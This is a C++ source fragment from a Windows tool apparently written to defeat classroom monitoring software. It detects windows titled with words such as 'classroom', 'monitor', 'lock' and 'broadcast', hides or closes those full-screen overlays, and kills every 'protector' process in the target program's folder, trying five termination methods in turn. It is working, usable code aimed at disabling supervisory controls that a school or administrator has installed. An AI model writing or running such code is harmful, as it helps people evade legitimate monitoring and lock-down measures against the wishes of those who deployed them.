            wchar_t windowTitle[256] = {};
            GetWindowTextW(hwnd, windowTitle, 256);
            
            bool suspiciousTitle = wcsstr(windowTitle, L"教室") != nullptr ||
                                 wcsstr(windowTitle, L"监控") != nullptr ||
                                 wcsstr(windowTitle, L"控制") != nullptr ||
                                 wcsstr(windowTitle, L"广播") != nullptr ||
                                 wcsstr(windowTitle, L"锁定") != nullptr ||
                                 wcsstr(windowTitle, L"全屏") != nullptr;
            
            if (suspiciousTitle) {
                std::vector<HWND>* windows = reinterpret_cast<std::vector<HWND>*>(lParam);
                windows->push_back(hwnd);
            }
        }
        
        return TRUE;
    }, reinterpret_cast<LPARAM>(&overlayWindows));
    
    return !overlayWindows.empty();
}

bool ProcessTerminator::RemoveFullscreenOverlay(HWND hwnd) {
    if (!hwnd || !IsWindow(hwnd)) return false;
    
    DWORD pid;
    GetWindowThreadProcessId(hwnd, &pid);
    
    if (pid == GetCurrentProcessId()) return false;
    
    PostMessageW(hwnd, WM_CLOSE, 0, 0);
    
    ShowWindow(hwnd, SW_HIDE);
    
    std::this_thread::sleep_for(std::chrono::milliseconds(10));
    
    if (IsWindow(hwnd)) {
        ShowWindow(hwnd, SW_MINIMIZE);
    }
    
    return true;
}

bool ProcessTerminator::DetectAndRemoveFullscreenOverlays() {
    std::vector<HWND> overlayWindows;
    
    DetectDXGIOverlayWindows(overlayWindows);
    for (HWND hwnd : overlayWindows) {
        if (IsSuspiciousOverlayWindow(hwnd)) {
            RemoveFullscreenOverlay(hwnd);
        }
    }
    
    overlayWindows.clear();
    DetectGDILayeredOverlay(overlayWindows);
    for (HWND hwnd : overlayWindows) {
        RemoveFullscreenOverlay(hwnd);
    }
    
    return true;
}

// 获取指定进程的可执行文件所在目录
std::wstring ProcessTerminator::GetProcessDirectory(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        return L"";
    }
    
    wchar_t path[MAX_PATH] = { 0 };
    DWORD size = MAX_PATH;
    std::wstring directory;
    
    if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
        std::wstring fullPath = path;
        size_t lastSlash = fullPath.find_last_of(L"\\/");
        if (lastSlash != std::wstring::npos) {
            directory = fullPath.substr(0, lastSlash);
        }
    }
    
    CloseHandle(hProcess);
    return directory;
}

// 获取当前进程的可执行文件所在目录
std::wstring ProcessTerminator::GetCurrentProcessDirectory() {
    wchar_t path[MAX_PATH] = { 0 };
    if (GetModuleFileNameW(NULL, path, MAX_PATH) == 0) {
        return L"";
    }
    
    std::wstring fullPath = path;
    size_t lastSlash = fullPath.find_last_of(L"\\/");
    if (lastSlash != std::wstring::npos) {
        return fullPath.substr(0, lastSlash);
    }
    return L"";
}

// 获取指定目录下的所有进程（不包括子目录）
std::vector<std::pair<DWORD, std::wstring>> ProcessTerminator::GetProcessesInSameDirectory(const std::wstring& targetDir) {
    std::vector<std::pair<DWORD, std::wstring>> processes;
    
    if (targetDir.empty()) return processes;
    
    // 标准化目标目录路径（转为小写用于比较）
    std::wstring normalizedTargetDir = targetDir;
    std::transform(normalizedTargetDir.begin(), normalizedTargetDir.end(), normalizedTargetDir.begin(), ::towlower);
    
    // 确保目录路径以反斜杠结尾，以便准确比较
    if (!normalizedTargetDir.empty() && normalizedTargetDir.back() != L'\\') {
        normalizedTargetDir += L'\\';
    }
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return processes;
    
    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // 跳过系统空闲进程和当前进程
            if (pe32.th32ProcessID == 0 || pe32.th32ProcessID == GetCurrentProcessId()) continue;
            
            // 获取进程的可执行文件路径
            HANDLE hProcess = OpenProcessEnhanced(pe32.th32ProcessID, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);
            if (!hProcess) continue;
            
            wchar_t path[MAX_PATH] = { 0 };
            DWORD size = MAX_PATH;
            std::wstring processDir;
            
            if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
                std::wstring fullPath = path;
                size_t lastSlash = fullPath.find_last_of(L"\\/");
                if (lastSlash != std::wstring::npos) {
                    processDir = fullPath.substr(0, lastSlash);
                }
            }
            CloseHandle(hProcess);
            
            if (!processDir.empty()) {
                std::transform(processDir.begin(), processDir.end(), processDir.begin(), ::towlower);
                if (!processDir.empty() && processDir.back() != L'\\') {
                    processDir += L'\\';
                }
                
                if (processDir == normalizedTargetDir) {
                    processes.push_back(std::make_pair(pe32.th32ProcessID, std::wstring(pe32.szExeFile)));
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return processes;
}

// 结束同目录下的保护进程
bool ProcessTerminator::TerminateSameDirectoryProtectors(const std::wstring& targetProcessPath, bool useAllMethods) {
    // 获取目标进程所在目录
    size_t lastSlash = targetProcessPath.find_last_of(L"\\/");
    if (lastSlash == std::wstring::npos) return true;
    
    std::wstring targetDir = targetProcessPath.substr(0, lastSlash);
    std::wstring targetProcessName = targetProcessPath.substr(lastSlash + 1);
    
    // 获取同目录下的所有进程
    std::vector<std::pair<DWORD, std::wstring>> sameDirProcesses = GetProcessesInSameDirectory(targetDir);
    
    if (sameDirProcesses.empty()) return true;
    
    std::wcout << L"检测到同目录下有 " << sameDirProcesses.size() << L" 个进程，正在分析保护进程..." << std::endl;
    
    bool allTerminated = true;
    std::vector<std::wstring> processesToTerminate;
    
    for (const auto& proc : sameDirProcesses) {
        const std::wstring& processName = proc.second;
        
        // 跳过目标进程自身
        if (_wcsicmp(processName.c_str(), targetProcessName.c_str()) == 0) continue;
        
        // 检查是否在白名单中
        if (IsSystemProcessWhitelisted(processName)) {
            std::wstring processPath = targetDir + L"\\" + processName;
            if (IsMicrosoftSigned(processPath)) continue;
        }
        
        processesToTerminate.push_back(processName);
    }
    
    if (processesToTerminate.empty()) {
        std::wcout << L"没有需要终止的同目录保护进程" << std::endl;
        return true;
    }
    
    std::wcout << L"开始终止 " << processesToTerminate.size() << L" 个保护进程..." << std::endl;
    
    // 终止检测到的保护进程
    int successCount = 0;
    int failCount = 0;
    for (const auto& procName : processesToTerminate) {
        int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, procName.c_str(), -1, NULL, 0, NULL, NULL);
        std::string narrowName;
        if (sizeNeeded > 0) {
            narrowName.resize(sizeNeeded - 1);
            WideCharToMultiByte(CP_UTF8, 0, procName.c_str(), -1, &narrowName[0], sizeNeeded, NULL, NULL);
        }
        
        bool result = false;
        if (!result) result = terminateByProcessName(narrowName);
        if (!result) result = terminateBySystemCommand(narrowName);
        if (!result) result = terminateByParentChildRelationship(narrowName);
        if (!result) result = terminateByProcessIsolationAndBlocking(narrowName);
        if (!result) result = terminateByWindowHandle(narrowName);
        
        if (result) {
            std::wcout << L"  [成功] 已终止保护进程: " << procName << std::endl;
            successCount++;
        } else {
            std::wcout << L"  [失败] 无法终止保护进程: " << procName << std::endl;
            allTerminated = false;
            failCount++;
        }
    }
    
    return allTerminated;
}

// fgj 与 ShowMainMenu 定义在 MainMenu.cpp 中
